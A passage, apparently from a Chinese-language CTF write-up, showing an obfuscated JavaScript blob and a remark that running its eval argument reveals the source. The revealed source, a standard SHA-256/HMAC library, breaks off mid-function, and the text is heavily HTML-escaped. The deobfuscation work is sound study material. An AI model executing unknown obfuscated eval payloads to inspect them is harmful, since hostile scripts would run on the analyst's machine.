J\u0026gt;\u0026gt;28)\u0026amp;o]+m[(J\u0026gt;\u0026gt;24)\u0026amp;o]+m[(J\u0026gt;\u0026gt;20)\u0026amp;o]+m[(J\u0026gt;\u0026gt;16)\u0026amp;o]+m[(J\u0026gt;\u0026gt;12)\u0026amp;o]+m[(J\u0026gt;\u0026gt;8)\u0026amp;o]+m[(J\u0026gt;\u0026gt;4)\u0026amp;o]+m[J\u0026amp;o]+m[(I\u0026gt;\u0026gt;28)\u0026amp;o]+m[(I\u0026gt;\u0026gt;24)\u0026amp;o]+m[(I\u0026gt;\u0026gt;20)\u0026amp;o]+m[(I\u0026gt;\u0026gt;16)\u0026amp;o]+m[(I\u0026gt;\u0026gt;12)\u0026amp;o]+m[(I\u0026gt;\u0026gt;8)\u0026amp;o]+m[(I\u0026gt;\u0026gt;4)\u0026amp;o]+m[I\u0026amp;o]+m[(H\u0026gt;\u0026gt;28)\u0026amp;o]+m[(H\u0026gt;\u0026gt;24)\u0026amp;o]+m[(H\u0026gt;\u0026gt;20)\u0026amp;o]+m[(H\u0026gt;\u0026gt;16)\u0026amp;o]+m[(H\u0026gt;\u0026gt;12)\u0026amp;o]+m[(H\u0026gt;\u0026gt;8)\u0026amp;o]+m[(H\u0026gt;\u0026gt;4)\u0026amp;o]+m[H\u0026amp;o];p(!k.x){1e+=m[(D\u0026gt;\u0026gt;28)\u0026amp;o]+m[(D\u0026gt;\u0026gt;24)\u0026amp;o]+m[(D\u0026gt;\u0026gt;20)\u0026amp;o]+m[(D\u0026gt;\u0026gt;16)\u0026amp;o]+m[(D\u0026gt;\u0026gt;12)\u0026amp;o]+m[(D\u0026gt;\u0026gt;8)\u0026amp;o]+m[(D\u0026gt;\u0026gt;4)\u0026amp;o]+m[D\u0026amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C\u0026gt;\u0026gt;24)\u0026amp;u,(C\u0026gt;\u0026gt;16)\u0026amp;u,(C\u0026gt;\u0026gt;8)\u0026amp;u,C\u0026amp;u,(B\u0026gt;\u0026gt;24)\u0026amp;u,(B\u0026gt;\u0026gt;16)\u0026amp;u,(B\u0026gt;\u0026gt;8)\u0026amp;u,B\u0026amp;u,(E\u0026gt;\u0026gt;24)\u0026amp;u,(E\u0026gt;\u0026gt;16)\u0026amp;u,(E\u0026gt;\u0026gt;8)\u0026amp;u,E\u0026amp;u,(F\u0026gt;\u0026gt;24)\u0026amp;u,(F\u0026gt;\u0026gt;16)\u0026amp;u,(F\u0026gt;\u0026gt;8)\u0026amp;u,F\u0026amp;u,(J\u0026gt;\u0026gt;24)\u0026amp;u,(J\u0026gt;\u0026gt;16)\u0026amp;u,(J\u0026gt;\u0026gt;8)\u0026amp;u,J\u0026amp;u,(I\u0026gt;\u0026gt;24)\u0026amp;u,(I\u0026gt;\u0026gt;16)\u0026amp;u,(I\u0026gt;\u0026gt;8)\u0026amp;u,I\u0026amp;u,(H\u0026gt;\u0026gt;24)\u0026amp;u,(H\u0026gt;\u0026gt;16)\u0026amp;u,(H\u0026gt;\u0026gt;8)\u0026amp;u,H\u0026amp;u];p(!k.x){2b.4A((D\u0026gt;\u0026gt;24)\u0026amp;u,(D\u0026gt;\u0026gt;16)\u0026amp;u,(D\u0026gt;\u0026gt;8)\u0026amp;u,D\u0026amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i\u0026lt;W;++i){r=G.1Q(i);p(r\u0026lt;R){L[M++]=r}z\\x20p(r\u0026lt;2v){L[M++]=(2t|(r\u0026gt;\u0026gt;6));L[M++]=(R|(r\u0026amp;V))}z\\x20p(r\u0026lt;2A||r\u0026gt;=2E){L[M++]=(2D|(r\u0026gt;\u0026gt;12));L[M++]=(R|((r\u0026gt;\u0026gt;6)\u0026amp;V));L[M++]=(R|(r\u0026amp;V))}z{r=2C+(((r\u0026amp;23)\u0026lt;\u0026lt;10)|(G.1Q(++i)\u0026amp;23));L[M++]=(2X|(r\u0026gt;\u0026gt;18));L[M++]=(R|((r\u0026gt;\u0026gt;12)\u0026amp;V));L[M++]=(R|((r\u0026gt;\u0026gt;6)\u0026amp;V));L[M++]=(R|(r\u0026amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y\u0026amp;\u0026amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W\u0026gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i\u0026lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n\u0026gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);   显然是一段加密过的js脚本，现在有个偷懒的办法，直接执行eval的参数看看效果，成功得到下面的代码。\n1  (function(){\u0026#39;use strict\u0026#39;;var ERROR=\u0026#39;input is invalid type\u0026#39;;var WINDOW=typeof window===\u0026#39;object\u0026#39;;var root=WINDOW?window:{};if(root.JS_SHA256_NO_WINDOW){WINDOW=false}var WEB_WORKER=!WINDOW\u0026amp;\u0026amp;typeof self===\u0026#39;object\u0026#39;;var NODE_JS=!root.JS_SHA256_NO_NODE_JS\u0026amp;\u0026amp;typeof process===\u0026#39;object\u0026#39;\u0026amp;\u0026amp;process.versions\u0026amp;\u0026amp;process.versions.node;if(NODE_JS){root=global}else if(WEB_WORKER){root=self}var COMMON_JS=!root.JS_SHA256_NO_COMMON_JS\u0026amp;\u0026amp;typeof module===\u0026#39;object\u0026#39;\u0026amp;\u0026amp;module.exports;var AMD=typeof define===\u0026#39;function\u0026#39;\u0026amp;\u0026amp;define.amd;var ARRAY_BUFFER=!root.JS_SHA256_NO_ARRAY_BUFFER\u0026amp;\u0026amp;typeof ArrayBuffer!==\u0026#39;undefined\u0026#39;;var HEX_CHARS=\u0026#39;0123456789abcdef\u0026#39;.split(\u0026#39;\u0026#39;);var EXTRA=[-2147483648,8388608,32768,128];var SHIFT=[24,16,8,0];var K=[0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];var OUTPUT_TYPES=[\u0026#39;hex\u0026#39;,\u0026#39;array\u0026#39;,\u0026#39;digest\u0026#39;,\u0026#39;arrayBuffer\u0026#39;];var blocks=[];if(root.JS_SHA256_NO_NODE_JS||!Array.isArray){Array.isArray=function(obj){return Object.prototype.toString.call(obj)===\u0026#39;[object Array]\u0026#39;}}if(ARRAY_BUFFER\u0026amp;\u0026amp;(root.JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW||!ArrayBuffer.isView)){ArrayBuffer.isView=function(obj){return typeof obj===\u0026#39;object\u0026#39;\u0026amp;\u0026amp;obj.buffer\u0026amp;\u0026amp;obj.buffer.constructor===ArrayBuffer}}var createOutputMethod=function(outputType,is224){return function(message){return new Sha256(is224,true).update(message)[outputType]()}};var createMethod=function(is224){var method=createOutputMethod(\u0026#39;hex\u0026#39;,is224);if(NODE_JS){method=nodeWrap(method,is224)}method.create=function(){return new Sha256(is224)};method.update=function(message){return method.create().update(message)};for(var i=0;i\u0026lt;OUTPUT_TYPES.length;++i){var type=OUTPUT_TYPES[i];method[type]=createOutputMethod(type,is224)}return method};var nodeWrap=function(method,is224){var crypto=eval(\u0026#34;require(\u0026#39;crypto\u0026#39;)\u0026#34;);var Buffer=eval(\u0026#34;require(\u0026#39;buffer\u0026#39;).Buffer\u0026#34;);var algorithm=is224?\u0026#39;sha224\u0026#39;:\u0026#39;sha256\u0026#39;;var nodeMethod=function(message){if(typeof message===\u0026#39;string\u0026#39;){return crypto.createHash(algorithm).update(message,\u0026#39;utf8\u0026#39;).digest(\u0026#39;hex\u0026#39;)}else{if(message===null||message===undefined){throw new Error(ERROR)}else if(message.constructor===ArrayBuffer){message=new Uint8Array(message)}}if(Array.isArray(message)||ArrayBuffer.isView(message)||message.constructor===Buffer){return crypto.createHash(algorithm).update(new Buffer(message)).digest(\u0026#39;hex\u0026#39;)}else{return method(message)}};return nodeMethod};var createHmacOutputMethod=function(outputType,is224){return function(key,message){return new HmacSha256(key,is224,true).update(message)[outputType]()}};var createHmacMethod=function(is224){var method=createHmacOutputMethod(\u0026#39;hex\u0026#39;,is224);method.create=function(key){return new HmacSha256(key,is224)};method.update=function(key,message){return method.create(key).update(message)};for(var i=0;i\u0026lt;OUTPUT_TYPES.length;++i){var type=OUTPUT_TYPES[i];method[type]=createHmacOutputMethod(type,is224)}return method};function Sha256(is224,sharedMemory){if(sharedMemory){blocks[0]=blocks[16]=blocks[1]=blocks[2]=blocks[3]=blocks[4]=blocks[5]=blocks[6]=blocks[7]=blocks[8]=blocks[9]=blocks[10]=blocks[11]=blocks[12]=blocks[13]=blocks[14]=blocks[15]=0;this.blocks=blocks}else{this.blocks=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}if(is224){this.h0=0xc1059ed8;this.h1=0x367cd507;this.h2=0x3070dd17;this.h3=0xf70e5939;this.h4=0xffc00b31;this.h5=0x68581511;this.h6=0x64f98fa7;this.h7=0xbefa4fa4}else{this.h0=0x6a09e667;this.h1=0xbb67ae85;this.h2=0x3c6ef372;this.h3=0xa54ff53a;this.h4=0x510e527f;this.h5=0x9b05688c;this.h6=0x1f83d9ab;this.h7=0x5be0cd19}this.block=this.start=this.bytes=this.hBytes=0;this.finalized=this.hashed=false;this.first=true;this.is224=is224}Sha256.prototype.update=function(message){if(this.finalized){return}var notString,type=typeof message;if(type!==\u0026#39;string\u0026#39;){if(type===\u0026#39;object\u0026#39;){if(message===null){throw new Error(ERROR)}else if(ARRAY_BUFFER\u0026amp;\u0026amp;message.constructor===ArrayBuffer){message=new Uint8Array(message)}else if(!Array.isArray(message)){if(!ARRAY_BUFFER||!ArrayBuffer.isView(message)){throw new Error(ERROR)}}}else{throw new Error(ERROR)}notString=true}var code,index=0,i,length=message.length,blocks=this.blocks;while(index\u0026lt;length){if(this.hashed){this.hashed=false;blocks[0]=this.block;blocks[16]=blocks[1]=blocks[2]=blocks[3]=blocks[4]=blocks[5]=blocks[6]=blocks[7]=blocks[8]=blocks[9]=blocks[10]=blocks[11]=blocks[12]=blocks[13]=blocks[14]=blocks[15]=0}if(notString){for(i=this.start;index\u0026lt;length\u0026amp;\u0026amp;i\u0026lt;64;++index){blocks[i\u0026gt;\u0026gt;2]|=message[index]\u0026lt;\u0026lt;SHIFT[i++\u0026amp;3]}}else{for(i=this.start;index\u0026lt;length\u0026amp;\u0026amp;i\u0026lt;64;++index){code=message.charCodeAt(index);if(code\u0026lt;0x80){blocks[i\u0026gt;\u0026gt;2]|=code\u0026lt;\u0026lt;SHIFT[i++\u0026amp;3]}else if(code\u0026lt;0x800){blocks[i\u0026gt;\u0026gt;2]|=(0xc0|(code\u0026gt;\u0026gt;6))\u0026lt;\u0026lt;SHIFT[i++\u0026amp;3];blocks[i\u0026gt;\u0026gt;2]|=(0x80|(code\u0026amp;0x3f))\u0026lt;\u0026lt;SHIFT[i++\u0026amp;3]}else if(code\u0026lt;0xd800||code\u0026gt;=0xe000){blocks[i\u0026gt;\u0026gt;2]|=(0xe0|(code\u0026gt;\u0026gt;12))\u0026lt;\u0026lt;SHIFT[i++\u0026amp;3];blocks[i\u0026gt;\u0026gt;2]|=(0x80|((code\u0026gt;\u0026gt;6)\u0026amp;0x3f))\u0026lt;\u0026lt;SHIFT[i++\u0026amp;3];blocks[i\u0026gt;\u0026gt;2]|=(0x80|(code\u0026amp;0x3f))\u0026lt;\u0026lt;SHIFT[i++\u0026amp;3]}else{code=0x10000+(((code\u0026amp;0x3ff)\u0026lt;\u0026lt;10)|(message.charCodeAt(++index)\u0026amp;0x3ff));blocks[i\u0026gt;\u0026gt;2]|=(0xf0|(code\u0026gt;\u0026gt;18))\u0026lt;\u0026lt;SHIFT[i++\u0026amp;3];blocks[i\u0026gt;\u0026gt;2]|=(0x80|((code\u0026gt;\u0026gt;12)\u0026amp;0x3f))\u0026lt;\u0026lt;SHIFT[i++\u0026amp;3];blocks[i\u0026gt;\u0026gt;2]|=(0x80|((code\u0026gt;\u0026gt;6)\u0026amp;0x3f))\u0026lt;\u0026lt;SHIFT[i++\u0026amp;3];blocks[i\u0026gt;\u0026gt;2]|=(0x80|(code\u0026amp;0x3f))\u0026lt;\u0026lt;SHIFT[i++\u0026amp;3]}}}this.lastByteIndex=i;this.bytes+=i-this.start;if(i\u0026gt;=64){this.block=blocks[16];this.start=i-64;this.hash();this.hashed=true}else{this.start=i}}if(this.bytes\u0026gt;4294967295){this.hBytes+=this.bytes/4294967296\u0026lt;\u0026lt;0;this.bytes=this.bytes%4294967296}return this};Sha256.prototype.finalize=function(){if(this.finalized){return}this.finalized=true;var blocks=this.blocks,i=this.lastByteIndex;blocks[16]=this.block;blocks[i\u0026gt;\u0026gt;2]|=EXTRA[i\u0026amp;3];this.block=blocks[16];if(i\u0026gt;=56){if(!this.hashed){this.hash()}blocks[0]=this.block;blocks[16]=blocks[1]=blocks[2]=blocks[3]=blocks[4]=blocks[5]=blocks[6]=blocks[7]=blocks[8]=blocks[9]=blocks[10]=blocks[11]=blocks[12]=blocks[13]=blocks[14]=blocks[15]=0}blocks[14]=this.hBytes\u0026lt;\u0026lt;3|this.bytes\u0026gt;\u0026gt;\u0026gt;29;blocks[15]=this.bytes\u0026lt;\u0026lt;3;this.hash()};Sha256.prototype.hash=function(){var a=this.h0,b=this.h1,c=this.h2,d=this.h3,e=this.h4,f=this.h5,g=this.h6,h=this.h7,blocks=this.blocks,j,s0,s1,maj,t1,t2,ch,ab,da,cd,bc;for(j=16;j\u0026lt;64;++j){t1=blocks[j-15];s0=((t1\u0026gt;\u0026gt;\u0026gt;7)|(t1\u0026lt;\u0026lt;25))^((t1\u0026gt;\u0026gt;\u0026gt;18)|(t1\u0026lt;\u0026lt;14))^(t1\u0026gt;\u0026gt;\u0026gt;3);t1=blocks[j-2];s1=((t1\u0026gt;\u0026gt;\u0026gt;17)|(t1\u0026lt;\u0026lt;15))^((t1\u0026gt;\u0026gt;\u0026gt;19)|(t1\u0026lt;\u0026lt;13))^(t1\u0026gt;\u0026gt;\u0026gt;10);blocks[j]=blocks[j-16]+s0+blocks[j-7]+s1\u0026lt;\u0026lt;0}bc=b\u0026amp;c;for(j=0;j\u0026lt;64;j+=4){if(this.first){if(this.is224){ab=300032;t1=blocks[0]-1413257819;h=t1-150054599\u0026lt;\u0026lt;0;d=t1+24177077\u0026lt;\u0026lt;0}else{ab=704751109;t1=blocks[0]-210244248;h=t1-1521486534\u0026lt;\u0026lt;0;d=t1+143694565\u0026lt;\u0026lt;0}this.first=false}else{s0=((a\u0026gt;\u0026gt;\u0026gt;2)|(a\u0026lt;\u0026lt;30))^((a\u0026gt;\u0026gt;\u0026gt;13)|(a\u0026lt;\u0026lt;19))^((a\u0026gt;\u0026gt;\u0026gt;22)|(a\u0026lt;\u0026lt;10));s1=((e\u0026gt;\u0026gt;\u0026gt;6)|(e\u0026lt;\u0026lt;26))^((e\u0026gt;\u0026gt;\u0026gt;11)|(e\u0026lt;\u0026lt;21))^((e\u0026gt;\u0026gt;\u0026gt;25)|(e\u0026lt;\u0026lt;7));ab=a\u0026amp;b;maj=ab^(a\u0026amp;c)^bc;ch=(e\u0026amp;f)^(~e\u0026amp;g);t1=h+s1+ch+K[j]+blocks[j];t2=s0+maj;h=d+t1\u0026lt;\u0026lt;0;d=t1+t2\u0026lt;\u0026lt;0}s0=((d\u0026gt;\u0026gt;\u0026gt;2)|(d\u0026lt;\u0026lt;30))^((d\u0026gt;\u0026gt;\u0026gt;13)|(d\u0026lt;\u0026lt;19))^((d\u0026gt;\u0026gt;\u0026gt;22)|(d\u0026lt;\u0026lt;10));s1=((h\u0026gt;\u0026gt;\u0026gt;6)|(h\u0026lt;\u0026lt;26))^((h\u0026gt;\u0026gt;\u0026gt;11)|(h\u0026lt;\u0026lt;21))^((h\u0026gt;\u0026gt;\u0026gt;25)|(h\u0026lt;\u0026lt;7));da=d\u0026amp;a;maj=da^(d\u0026amp;b)^ab;ch=(h\u0026amp;e)^(~h\u0026amp;f);t1=g+s1+ch+K[j+1]+blocks[j+1];t2=s0+maj;g=c+t1\u0026lt;\u0026lt;0;c=t1+t2\u0026lt;\u0026lt;0;s0=((c\u0026gt;\u0026gt;\u0026gt;2)|(c\u0026lt;\u0026lt;30))^((c\u0026gt;\u0026gt;\u0026gt;13)|(c\u0026lt;\u0026lt;19))^((c\u0026gt;\u0026gt;\u0026gt;22)|(c\u0026lt;\u0026lt;10));s1=((g\u0026gt;\u0026gt;\u0026gt;6)|(g\u0026lt;\u0026lt;26))^((g\u0026gt;\u0026gt;\u0026gt;11)|(g\u0026lt;\u0026lt;21))^((g\u0026gt;\u0026gt;\u0026gt;25)|(g\u0026lt;\u0026lt;7));cd=c\u0026amp;d;maj=cd^(c\u0026amp;a)^da;ch=(g\u0026amp;h)^(~g\u0026amp;e);t1=f+s1+ch+K[j+2]+blocks[j+2];t2=s0+maj;f=b+t1\u0026lt;\u0026lt;0;b=t1+t2\u0026lt;\u0026lt;0;s0=((b\u0026gt;\u0026gt;\u0026gt;2)|(b\u0026lt;\u0026lt;30))^((b\u0026gt;\u0026gt;\u0026gt;13)|(b\u0026lt;\u0026lt;19))^((b\u0026gt;\u0026gt;\u0026gt;22)|(b\u0026lt;\u0026lt;10));s1=((f\u0026gt;\u0026gt;\u0026gt;6)|(f\u0026lt;\u0026lt;26))^((f\u0026gt;\u0026gt;\u0026gt;11)|(f\u0026lt;\u0026lt;21))^((f\u0026gt;\u0026gt;\u0026gt;25)|(f\u0026lt;\u0026lt;7));bc=b\u0026amp;c;maj=bc^(b\u0026amp;d)^cd;ch=(f\u0026amp;g)^(~f\u0026amp;h);t1=e+s1+ch+K[j+3]+blocks[j+3];t2=s0+maj;e=a+t1\u0026lt;\u0026lt;0;a=t1+t2\u0026lt;\u0026lt;0}this.h0=this.h0+a\u0026lt;\u0026lt;0;this.h1=this.h1+b\u0026lt;\u0026lt;0;this.h2=this.h2+c\u0026lt;\u0026lt;0;this.h3=this.h3+d\u0026lt;\u0026lt;0;this.h4=this.h4+e\u0026lt;\u0026lt;0;this.h5=this.h5+f\u0026lt;\u0026lt;0;this.h6=this.h6+g\u0026lt;\u0026lt;0;this.h7=this.h7+h\u0026lt;\u0026lt;0};Sha256.prototype.hex=function(){this.finalize();var h0=this.h0,h1=this.h1,h2=this.h2,h3=this.h3,h4=this.h4,h5=this.h5,h6=this.h6,h7=this.h7;var hex=HEX_CHARS[(h0\u0026gt;\u0026gt;28)\u0026amp;0x0F]+HEX_CHARS[(h0\u0026gt;\u0026gt;24)\u0026amp;0x0F]+HEX_CHARS[(h0\u0026gt;\u0026gt;20)\u0026amp;0x0F]+HEX_CHARS[(h0\u0026gt;\u0026gt;16)\u0026amp;0x0F]+HEX_CHARS[(h0\u0026gt;\u0026gt;12)\u0026amp;0x0F]+HEX_CHARS[(h0\u0026gt;\u0026gt;8)\u0026amp;0x0F]+HEX_CHARS[(h0\u0026gt;\u0026gt;4)\u0026amp;0x0F]+HEX_CHARS[h0\u0026amp;0x0F]+HEX_CHARS[(h1\u0026gt;\u0026gt;28)\u0026amp;0x0F]+HEX_CHARS[(h1\u0026gt;\u0026gt;24)\u0026amp;0x0F]+HEX_CHARS[(h1\u0026gt;\u0026gt;20)\u0026amp;0x0F]+HEX_CHARS[(h1\u0026gt;\u0026gt;16)\u0026amp;0x0F]+HEX_CHARS[(h1\u0026gt;\u0026gt;12)\u0026amp;0x0F]+HEX_CHARS[(h1\u0026gt;\u0026gt;8)\u0026amp;0x0F]+HEX_CHARS[(h1\u0026gt;\u0026gt;4)\u0026amp;0x0F]+HEX_CHARS[h1\u0026amp;0x0F]+HEX_CHARS[(h2\u0026gt;\u0026gt;28)\u0026amp;0x0F]+HEX_CHARS[(h2\u0026gt;\u0026gt;24)\u0026amp;0x0F]+HEX_CHARS[(h2\u0026gt;\u0026gt;20)\u0026amp;0x0F]+HEX_CHARS[(h2\u0026gt;\u0026gt;16)\u0026amp;0x0F]+HEX_CHARS[(h2\u0026gt;\u0026gt;12)\u0026amp;0x0F]+HEX_CHARS[(h2\u0026gt;\u0026gt;8)\u0026amp;0x0F]+HEX_CHARS[(h2\u0026gt;\u0026gt;4)\u0026amp;0x0F]+HEX_CHARS[h2\u0026amp;0x0F]+HEX_CHARS[(h3\u0026gt;\u0026gt;28)\u0026amp;0x0F]+HEX_CHARS[(h3\u0026gt;\u0026gt;24)\u0026amp;0x0F]+HEX_CHARS[(h3\u0026gt;\u0026gt;20)\u0026amp;0x0F]+HEX_CHARS[(h3\u0026gt;\u0026gt;16)\u0026amp;0x0F]+HEX_CHARS[(h3\u0026gt;\u0026gt;12)\u0026amp;0x0F]+HEX_CHARS[(h3\u0026gt;\u0026gt;8)\u0026amp;0x0F]+HEX_CHARS[(h3\u0026gt;\u0026gt;4)\u0026amp;0x0F]+HEX_CHARS[h3\u0026amp;0x0F]+HEX_CHARS[(h4\u0026gt;\u0026gt;28)\u0026amp;0x0F]+HEX_CHARS[(h4\u0026gt;\u0026gt;24)\u0026amp;0x0F]+HEX_CHARS[(h4\u0026gt;\u0026gt;20)\u0026amp;0x0F]+HEX_CHARS[(h4\u0026gt;\u0026gt;16)\u0026amp;0x0F]+HEX_CHARS[(h4\u0026gt;\u0026gt;12)\u0026amp;0x0F]+HEX_CHARS[(h4\u0026gt;\u0026gt;8)\u0026amp;0x0F]+HEX_CHARS[(h4\u0026gt;\u0026gt;4)\u0026amp;0x0F]+HEX_CHARS[h4\u0026amp;0x0F]+HEX_CHARS[(h5\u0026gt;\u0026gt;28)\u0026amp;0x0F]+HEX_CHARS[(h5\u0026gt;\u0026gt;24)\u0026amp;0x0F]+HEX_CHARS[(h5\u0026gt;\u0026gt;20)\u0026amp;0x0F]+HEX_CHARS[(h5\u0026gt;\u0026gt;16)\u0026amp;0x0F]+HEX_CHARS[(h5\u0026gt;\u0026gt;12)\u0026amp;0x0F]+HEX_CHARS[(h5\u0026gt;\u0026gt;8)\u0026amp;0x0F]+HEX_CHARS[(h5\u0026gt;\u0026gt;4)\u0026amp;0x0F]+HEX_CHARS[h5\u0026amp;0x0F]+HEX_CHARS[(h6\u0026gt;\u0026gt;28)\u0026amp;0x0F]+HEX_CHARS[(h6\u0026gt;\u0026gt;24)\u0026amp;0x0F]+HEX_CHARS[(h6\u0026gt;\u0026gt;20)\u0026amp;0x0F]+HEX_CHARS[(h6\u0026gt;\u0026gt;16)\u0026amp;0x0F]+HEX_CHARS[(h6\u0026gt;\u0026gt;12)\u0026amp;0x0F]+HEX_CHARS[(h6\u0026gt;\u0026gt;8)\u0026amp;0x0F]+HEX_CHARS[(h6\u0026gt;\u0026gt;4)\u0026amp;0x0F]+HEX_CHARS[h6\u0026amp;0x0F];if(!this.is224){hex+=HEX_CHARS[(h7\u0026gt;\u0026gt;28)\u0026amp;0x0F]+HEX_CHARS[(h7\u0026gt;\u0026gt;24)\u0026amp;0x0F]+HEX_CHARS[(h7\u0026gt;\u0026gt;20)\u0026amp;0x0F]+HEX_CHARS[(h7\u0026gt;\u0026gt;16)\u0026amp;0x0F]+HEX_CHARS[(h7\u0026gt;\u0026gt;12)\u0026amp;0x0F]+HEX_CHARS[(h7\u0026gt;\u0026gt;8)\u0026amp;0x0F]+HEX_CHARS[(h7\u0026gt;\u0026gt;4)\u0026amp;0x0F]+HEX_CHARS[h7\u0026amp;0x0F]}return hex};Sha256.prototype.toString=Sha256.prototype.hex;Sha256.prototype.digest=function(){this.finalize();var h0=this.h0,h1=this.h1,h2=this.h2,h3=this.h3,h4=this.h4,h5=this.h5,h6=this.h6,h7=this.h7;var arr=[(h0\u0026gt;\u0026gt;24)\u0026amp;0xFF,(h0\u0026gt;\u0026gt;16)\u0026amp;0xFF,(h0\u0026gt;\u0026gt;8)\u0026amp;0xFF,h0\u0026amp;0xFF,(h1\u0026gt;\u0026gt;24)\u0026amp;0xFF,(h1\u0026gt;\u0026gt;16)\u0026amp;0xFF,(h1\u0026gt;\u0026gt;8)\u0026amp;0xFF,h1\u0026amp;0xFF,(h2\u0026gt;\u0026gt;24)\u0026amp;0xFF,(h2\u0026gt;\u0026gt;16)\u0026amp;0xFF,(h2\u0026gt;\u0026gt;8)\u0026amp;0xFF,h2\u0026amp;0xFF,(h3\u0026gt;\u0026gt;24)\u0026amp;0xFF,(h3\u0026gt;\u0026gt;16)\u0026amp;0xFF,(h3\u0026gt;\u0026gt;8)\u0026amp;0xFF,h3\u0026amp;0xFF,(h4\u0026gt;\u0026gt;24)\u0026amp;0xFF,(h4\u0026gt;\u0026gt;16)\u0026amp;0xFF,(h4\u0026gt;\u0026gt;8)\u0026amp;0xFF,h4\u0026amp;0xFF,(h5\u0026gt;\u0026gt;24)\u0026amp;0xFF,(h5\u0026gt;\u0026gt;16)\u0026amp;0xFF,(h5\u0026gt;\u0026gt;8)\u0026amp;0xFF,h5\u0026amp;0xFF,(h6\u0026gt;\u0026gt;24)\u0026amp;0xFF,(h6\u0026gt;\u0026gt;16)\u0026amp;0xFF,(h6\u0026gt;\u0026gt;8)\u0026amp;0xFF,h6\u0026amp;0xFF];if(!this.is224){arr.push((h7\u0026gt;\u0026gt;24)\u0026amp;0xFF,(h7\u0026gt;\u0026gt;16)\u0026amp;0xFF,(h7\u0026gt;\u0026gt;8)\u0026amp;0xFF,h7\u0026amp;0xFF)}return arr};Sha256.prototype.array=Sha256.prototype.digest;Sha256.prototype.arrayBuffer=function(){this.finalize();var buffer=new ArrayBuffer(this.is224?28:32);var dataView=new DataView(buffer);dataView.setUint32(0,this.h0);dataView.setUint32(4,this.h1);dataView.setUint32(8,this.h2);dataView.setUint32(12,this.h3);dataView.setUint32(16,this.h4);dataView.setUint32(20,this.h5);dataView.setUint32(24,this.h6);if(!this.is224){dataView.setUint32(28,this.h7)}return buffer};function HmacSha256(key,is224,sharedMemory){var i,type=typeof key;if(type===\u0026#39;string\u0026#39;){var bytes=[],length=key.length,index=0,code;for(i=0;i\u0026lt;length;++i){code=key.charCodeAt(i);if(code\u0026lt;0x80){bytes[index++]=code}else if(code\u0026lt;0x800){bytes[index++]=(0xc0|(code\u0026gt;\u0026gt;6));bytes[index++]=(0x80|(code\u0026amp;0x3f))}else 